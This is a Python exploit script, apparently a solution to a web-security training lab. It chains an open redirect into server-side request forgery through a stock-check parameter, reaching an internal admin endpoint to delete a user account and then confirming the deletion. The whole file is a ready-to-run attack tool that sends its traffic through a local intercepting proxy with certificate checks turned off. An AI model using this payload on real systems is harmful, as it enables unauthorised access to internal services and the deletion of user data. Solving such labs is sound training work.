#!/usr/bin/env python3

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    delete_user_ssrf_payload = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if the user is deleted
    admin_page_ssrf_payload = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/'
    params2 = {'stockApi': admin_page_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'Carlos' not in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful")

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)

if __name__ == "__main__":
    main()
